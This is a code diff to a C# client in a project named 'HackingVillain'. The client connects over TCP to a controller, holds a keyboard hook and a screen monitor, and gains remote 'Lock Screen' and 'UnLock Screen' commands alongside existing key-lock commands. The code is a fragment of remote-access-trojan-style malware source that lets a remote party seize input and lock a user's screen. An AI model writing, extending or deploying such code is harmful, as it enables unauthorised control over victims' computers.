@@ -19,6 +19,7 @@ namespace HackingVillain
         ISocket _client;
         Hooker _hook;
         ScreenMonitor _monitor;
+        LockForm _lock;
         Thread _listen;
         public Client()
         {
@@ -26,6 +27,7 @@ namespace HackingVillain
             _client = AweSock.TcpConnect("127.0.0.1", 8080);
             _hook = new Hooker(_client);
             //_monitor = new ScreenMonitor(_client);
+            _lock = new LockForm(_hook);
 
             _listen = new Thread(() =>
             {
@@ -58,6 +60,14 @@ namespace HackingVillain
             else if(data == "UnLock Key")
             {
                 _hook.UnLock();
+            }
+            else if(data == "Lock Screen")
+            {
+                _lock.ShowDialog();
+            }
+            else if(data == "UnLock Screen")
+            {
+                _lock.Fuck();
             }
         }
     }
